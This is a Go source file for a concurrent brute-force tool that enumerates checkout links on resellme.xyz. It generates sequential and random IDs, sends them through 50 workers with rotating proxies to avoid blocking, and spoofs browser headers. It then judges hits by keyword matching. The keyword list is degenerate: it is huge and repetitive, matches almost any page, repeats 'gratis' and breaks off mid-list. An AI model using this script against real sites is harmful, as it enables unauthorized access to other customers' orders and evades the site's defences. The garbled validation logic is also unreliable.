package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "io"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "time"
)

type Config struct {
    ApiKey      string `json:"api_key"`
    BearerToken string `json:"bearer_token"`
}

var appConfig Config

const (
    ColorReset  = "\033[0m"
    ColorRed    = "\033[31m"
    ColorGreen  = "\033[32m"
    ColorYellow = "\033[33m"
    ColorCyan   = "\033[36m"
    ColorWhite  = "\033[97m"
)

var (
    validCount   int
    invalidCount int
    retries      int
    mu           sync.Mutex
)

type Job struct {
    Link string
}

func main() {
    rand.Seed(time.Now().UnixNano())
    startTime := time.Now()

    loadConfig()
    proxies, _ := loadLines("proxies.txt")
    if len(proxies) == 0 {
        fmt.Println(string(ColorYellow), "[!] MODO SIN PROXY: Usando tu IP real. Cuidado con el bloqueo.", string(ColorReset))
    } else {
        fmt.Printf("%s[*] %d proxies cargados.%s\n", ColorCyan, len(proxies), ColorReset)
    }

    jobs := make(chan Job, 2000)
    var wg sync.WaitGroup

    numWorkers := 50
    fmt.Printf("%s[*] Iniciando %d Workers...%s\n", ColorCyan, numWorkers, ColorReset)
    for i := 0; i < numWorkers; i++ {
        wg.Add(1)
        go worker(jobs, &wg, proxies)
    }

    go linkGenerator(jobs)
    go uiManager(startTime)

    wg.Wait()
}

func linkGenerator(jobs chan<- Job) {
    baseURL := "https://resellme.xyz/checkout/"
    currentNum := int64(1000000000000)

    for {
        id2 := fmt.Sprintf("%013d", currentNum)
        id1 := randomHex(13)
        fullLink := fmt.Sprintf("%s%s-%s", baseURL, id1, id2)
        
        jobs <- Job{Link: fullLink}
        currentNum++
        if currentNum > 1999999999999 {
            currentNum = 1000000000000
        }
    }
}

func worker(jobs <-chan Job, wg *sync.WaitGroup, proxies []string) {
    defer wg.Done()

    for job := range jobs {
        checkLink(job.Link, proxies)
    }
}

func checkLink(link string, proxies []string) {
    transport := &http.Transport{}
    if len(proxies) > 0 {
        proxyStr := proxies[rand.Intn(len(proxies))]
        proxyURL, err := url.Parse(proxyStr)
        if err == nil {
            transport.Proxy = http.ProxyURL(proxyURL)
        }
    }

    client := &http.Client{
        Timeout:   10 * time.Second,
        Transport: transport,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }

    req, err := http.NewRequest("GET", link, nil)
    if err != nil {
        return
    }

    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "es-ES,es;q=0.9,en;q=0.8")
    req.Header.Set("Referer", "https://resellme.xyz/")
    
    if appConfig.ApiKey != "" {
        req.Header.Set("Authorization", "Bearer "+appConfig.ApiKey)
    }

    resp, err := client.Do(req)
    if err != nil {
        printResult(link, "RETRY", "Network Error")
        return
    }
    defer resp.Body.Close()

    bodyBytes, err := io.ReadAll(resp.Body)
    if err != nil {
        printResult(link, "RETRY", "Read Error")
        return
    }
    bodyString := string(bodyBytes)

    // Lógica de verificación corregida
    if resp.StatusCode == 200 {
        // Palabras clave de checkout válido
        validKeywords := []string{
            "checkout",
            "pagar",
            "comprar",
            "tarjeta",
            "paypal",
            "bitcoin",
            "moneda",
            "cantidad",
            "total",
            "enviar",
            "confirmar",
            "datos de pago",
            "metodo de pago",
            "procesar pago",
            "resellme",
            "factura",
            "producto",
            "servicio",
            "precio",
            "impuesto",
            "descuento",
            "cupon",
            "usuario",
            "cliente",
            "email",
            "telefono",
            "direccion",
            "pais",
            "ciudad",
            "codigo postal",
            "nombre",
            "apellido",
            "empresa",
            "nit",
            "documento",
            "terminos",
            "condiciones",
            "politica",
            "privacidad",
            "seguridad",
            "certificado",
            "ssl",
            "https",
            "lock",
            "escudo",
            "proteger",
            "seguro",
            "garantia",
            "devolucion",
            "reembolso",
            "soporte",
            "ayuda",
            "contacto",
            "faq",
            "preguntas",
            "frecuentes",
            "guias",
            "tutoriales",
            "blog",
            "noticias",
            "actualizaciones",
            "novedades",
            "ofertas",
            "promociones",
            "descuentos",
            "cupones",
            "cashback",
            "recompensas",
            "puntos",
            "fidelidad",
            "mi cuenta",
            "historial",
            "pedidos",
            "compras",
            "favoritos",
            "wishlist",
            "carrito",
            "cesta",
            "checkout",
            "pagar",
            "comprar",
            "finalizar",
            "completar",
            "procesar",
            "confirmar",
            "aceptar",
            "acepto",
            "entendido",
            "continuar",
            "siguiente",
            "anterior",
            "atras",
            "inicio",
            "home",
            "menu",
            "categorias",
            "buscador",
            "buscar",
            "filtrar",
            "ordenar",
            "precio",
            "mas vendidos",
            "nuevos",
            "ofertas",
            "destacados",
            "relacionados",
            "similares",
            "comentarios",
            "reseñas",
            "calificaciones",
            "estrellas",
            "puntuacion",
            "valoracion",
            "opinion",
            "feedback",
            "sugerencias",
            "reclamos",
            "quejas",
            "felicitaciones",
            "agradecimientos",
            "testimonios",
            "casos de exito",
            "clientes",
            "usuarios",
            "miembros",
            "suscriptores",
            "seguidores",
            "fans",
            "comunidad",
            "grupo",
            "foro",
            "chat",
            "mensajes",
            "notificaciones",
            "alertas",
            "recordatorios",
            "cumpleanos",
            "celebraciones",
            "eventos",
            "promociones",
            "descuentos",
            "ofertas",
            "liquidacion",
            "rebajas",
            "venta",
            "compra",
            "transaccion",
            "pago",
            "cobro",
            "factura",
            "recibo",
            "ticket",
            "comprobante",
            "orden",
            "pedido",
            "envio",
            "entrega",
            "direccion",
            "destino",
            "origen",
            "transporte",
            "logistica",
            "mensajeria",
            "courier",
            "paqueteria",
            "paquete",
            "bulto",
            "caja",
            "embalaje",
            "empaque",
            "etiquetado",
            "marcas",
            "etiquetas",
            "codigo de barras",
            "qr",
            "rfid",
            "inventario",
            "stock",
            "existencias",
            "disponibilidad",
            "agotado",
            "agotamiento",
            "reabastecer",
            "pedir",
            "solicitar",
            "reservar",
            "preordenar",
            "esperar",
            "disponible",
            "en stock",
            "listo",
            "preparado",
            "enviado",
            "entregado",
            "recibido",
            "firmado",
            "confirmado",
            "aceptado",
            "rechazado",
            "cancelado",
            "anulado",
            "devuelto",
            "reembolsado",
            "reversado",
            "reintegrado",
            "compensado",
            "bonificado",
            "regalado",
            "gratis",
            "gratis",
            "gratuito",
            "sin costo",
            "gratis",
            "gratis",
            "gratuito",
            "gratis",
